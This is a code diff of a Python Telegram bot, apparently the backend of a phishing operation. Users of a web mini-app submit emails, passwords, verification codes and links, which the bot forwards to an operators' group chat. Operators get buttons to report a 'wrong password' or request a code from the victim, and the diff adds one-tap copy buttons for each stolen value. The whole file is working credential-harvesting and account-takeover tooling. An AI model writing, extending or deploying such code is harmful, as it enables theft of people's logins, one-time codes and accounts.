@@ -1,12 +1,13 @@
 import os
 import logging
 import json
+import asyncio
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-GROUP_CHAT_ID = -1005362277607  # ← СЮДА ВСТАВЬ ID ГРУППЫ (с минусом!)
+BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "ТОКЕН_ВТОРОГО_БОТА")
+GROUP_CHAT_ID = -1005362277607  # ← ID ГРУППЫ (с минусом!)
 WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp2/"
 # ===============================================
 
@@ -105,13 +106,10 @@ class ErubBot:
         text = update.message.text
         chat_id = update.effective_chat.id
 
-        # Если сообщение из группы — игнорируем (чтобы не зациклить)
         if chat_id == GROUP_CHAT_ID:
             return
 
-        # ===== Если сообщение от обычного пользователя =====
         if user_id != GROUP_CHAT_ID:
-            # ---- Код ----
             if user_sessions.get(user_id, {}).get('awaiting_code'):
                 await self.application.bot.send_message(
                     chat_id=GROUP_CHAT_ID,
@@ -122,7 +120,6 @@ class ErubBot:
                 await update.message.reply_text("✅ Отправлено")
                 return
 
-            # ---- Ссылка ----
             if user_sessions.get(user_id, {}).get('awaiting_link'):
                 await self.application.bot.send_message(
                     chat_id=GROUP_CHAT_ID,
@@ -136,7 +133,6 @@ class ErubBot:
             await update.message.reply_text("ℹ️ Используйте кнопку «Войти в систему»")
             return
 
-        # ===== Если сообщение от администратора (JSON) =====
         if text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -146,9 +142,20 @@ class ErubBot:
                 code = data.get('code')
                 link = data.get('link')
 
-                # ---- Обычный вход ----
                 if email and password and not code and not link:
+                    # КНОПКА ДЛЯ КОПИРОВАНИЯ ПОЧТЫ
+                    copy_email_btn = InlineKeyboardButton(
+                        text="📧 Копировать почту",
+                        copy_text=email
+                    )
+                    # КНОПКА ДЛЯ КОПИРОВАНИЯ ПАРОЛЯ
+                    copy_pass_btn = InlineKeyboardButton(
+                        text="🔑 Копировать пароль",
+                        copy_text=password
+                    )
+
                     keyboard = [
+                        [copy_email_btn, copy_pass_btn],
                         [
                             InlineKeyboardButton("❌ Неправильный пароль", callback_data=f"wrong_{target_user_id}"),
                             InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}"),
@@ -167,25 +174,50 @@ class ErubBot:
                         parse_mode="Markdown"
                     )
 
-                # ---- Код ----
                 elif code:
+                    # КНОПКА ДЛЯ КОПИРОВАНИЯ КОДА
+                    copy_code_btn = InlineKeyboardButton(
+                        text="📋 Копировать код",
+                        copy_text=code
+                    )
+                    keyboard = [[copy_code_btn]]
+                    reply_markup = InlineKeyboardMarkup(keyboard)
+
                     await self.application.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"📧 Код от {target_user_id}: `{code}`",
+                        reply_markup=reply_markup,
                         parse_mode="Markdown"
                     )
 
-                # ---- Ссылка ----
                 elif link:
+                    # КНОПКА ДЛЯ КОПИРОВАНИЯ ССЫЛКИ
+                    copy_link_btn = InlineKeyboardButton(
+                        text="🔗 Копировать ссылку",
+                        copy_text=link
+                    )
+                    keyboard = [[copy_link_btn]]
+                    reply_markup = InlineKeyboardMarkup(keyboard)
+
                     await self.application.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"🔗 Ссылка от {target_user_id}: `{link}`",
+                        reply_markup=reply_markup,
                         parse_mode="Markdown"
                     )
 
-                # ---- E-ID вход ----
                 elif data.get('type') == 'eid_login':
+                    copy_email_btn = InlineKeyboardButton(
+                        text="📧 Копировать почту",
+                        copy_text=email
+                    )
+                    copy_pass_btn = InlineKeyboardButton(
+                        text="🔑 Копировать пароль",
+                        copy_text=password
+                    )
+
                     keyboard = [
+                        [copy_email_btn, copy_pass_btn],
                         [
                             InlineKeyboardButton("❌ Неправильный пароль", callback_data=f"wrong_{target_user_id}"),
                             InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}"),
@@ -208,11 +240,21 @@ class ErubBot:
                 logger.error(f"❌ Ошибка: {e}")
                 await update.message.reply_text(f"❌ Ошибка: {e}")
 
+    # ===== 4. ЗАПУСК С ПРИНУДИТЕЛЬНЫМ СБРОСОМ =====
     def run(self):
         print("=" * 50)
         print("🤖 БОТ ЗАПУЩЕН")
         print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
         print("=" * 50)
+
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(self.application.bot.delete_webhook(drop_pending_updates=True))
+            print("✅ Старые сессии завершены, вебхук сброшен")
+        except Exception as e:
+            print(f"⚠️ Ошибка при сбросе сессий: {e}")
+
         self.application.run_polling()
 
 
